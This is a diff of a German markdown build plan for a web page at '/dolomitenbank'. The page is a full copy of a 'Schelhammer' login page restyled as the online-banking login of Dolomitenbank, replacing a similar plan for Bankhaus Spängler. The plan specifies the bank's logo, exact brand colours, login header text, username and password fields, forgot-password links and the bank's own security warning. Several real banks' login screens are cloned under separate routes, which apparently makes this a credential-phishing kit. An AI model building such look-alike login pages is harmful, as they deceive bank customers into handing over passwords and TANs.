@@ -1,44 +1,45 @@
 
 
-## Neue Seite `/bankhausspaengler` — Kopie von Schelhammer mit Anpassungen
+## Neue Seite `/dolomitenbank` — Kopie von Schelhammer mit Anpassungen
 
 ### Vorbereitungen
-1. **Hintergrundbild kopieren** — `user-uploads://spaengler.png` → `src/assets/spaengler-bg.png`
-2. **Route hinzufügen** — `/bankhausspaengler` in `src/App.tsx`
+1. **Assets** — Logo und Hintergrundbild aus Upload nach `src/assets/dolomitenbank-logo.{ext}` und `src/assets/dolomitenbank-bg.{ext}`
+2. **Route** — `/dolomitenbank` in `src/App.tsx`
 
-### Neue Datei: `src/pages/BankhausSpaengler.tsx`
-Komplettkopie von `Schelhammer.tsx` mit folgenden Änderungen:
+### Neue Datei: `src/pages/Dolomitenbank.tsx`
+Komplettkopie von `Schelhammer.tsx`, eigenständig, mit folgenden Änderungen:
 
-1. **Header & Logo entfernen** — Kompletter `<header>` Block weg. Kein Logo-Import.
+1. **Header** — bleibt, aber Hintergrundfarbe `#52636b`, Logo wird das angehängte Dolomitenbank-Logo
 
-2. **Hintergrundbild** — `schelhammerBg` → `spaenglerBg` (importiert aus `spaengler-bg.png`)
+2. **Hintergrundbild** — angehängtes Background-Bild verwenden
 
-3. **Farbe `#d31220` → `#43638d`** überall:
-   - Card-Header-Bar Hintergrund
-   - Weiter-Button Hintergrund
-   - Focus-States der Inputs (boxShadow, borderColor)
-   - X-Button-Farbe bei Focus
+3. **Login-Header-Bar** — Hintergrund `#637781`, Text `"Login DolomitenBanking"` in Farbe `#edeff0`
 
-4. **Eingabefelder immer "aktiviert" aussehen**:
-   - Standard-Hintergrund: `#dee3eb` (statt `#f1f1f1`)
-   - Standard-Border: `#43638d` (statt `#dedede`)
-   - Standard-boxShadow: `0 0 0 1px #43638d` (statt `none`)
-   - Focus-Hintergrund bleibt `#dee3eb`, Focus-Border bleibt `#43638d`
+4. **Info-Text** (deutsch):
+   > Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Passwort oder einer TAN fragen.
+   - Englische Übersetzung analog anpassen
 
-5. **English-Text Farbe** — `#d31220` → `#b0916b`
+5. **English-Toggle** — Farbe `#637781`
 
-6. **"Sie melden sich zum ersten Mal an?"** — Bleibt entfernt (wie gewünscht, Block wird nicht eingefügt)
+6. **Eingabefelder**:
+   - Standard: Hintergrund `#e5e7e9`, Border/Outline `#e5e7e9`
+   - Focus: Hintergrund `#e5e7e9` (bleibt gleich), Border/Outline schwarz (`#000`)
+   - X-Button-Farbe entsprechend anpassen
 
-7. **"Benutzername vergessen" / "Passwort vergessen"**:
-   - Fragezeichen hinzufügen: `"Benutzername vergessen?"` / `"Passwort vergessen?"`
-   - Englisch: `"Forgot username?"` / `"Forgot password?"`
-   - Farbe: `#b0916b` (statt `#d31220`)
+7. **Weiter-Button** — Hintergrund `#637781`, Textfarbe `#edeff0`
 
-8. **Neuer Link "Live Hilfe"** unter den vergessen-Links:
-   - Info-Icon (Kreis mit "i") davor, aus lucide-react (`Info`)
-   - Text: `"Live Hilfe"` / EN: `"Live Help"`
-   - Farbe: `#b0916b`
+8. **"Sie melden sich zum ersten Mal an?"** — entfernen
+
+9. **Terms-Text ersetzen** durch (in schwarz, nicht zentriert oder zentriert wie bisher):
+   > Funktioniert der Einstieg nicht? Haben Sie noch eine Verfügernummer? - Hier erfahren Sie wie Sie zu Ihrem neuem Benutzername / Passwort kommen. Ein Einstieg mit Ihrer bisherigen Verfügernummer ist nicht mehr möglich!
+   - Immer sichtbar (auch auf Englisch, oder nur deutsch — wie Terms bei Schelhammer)
+
+10. **Links unten**:
+    - `"Benutzername vergessen?"` in `#637781`
+    - `"Passwort vergessen"` (ohne ?) in `#637781`
+    - Leerzeile
+    - `"Mehr über das DolomitenBanking"` in `#637781`
 
 ### Datei: `src/App.tsx`
-- Import `BankhausSpaengler` und Route `/bankhausspaengler` hinzufügen
+- Import `Dolomitenbank` und Route `/dolomitenbank` hinzufügen
 
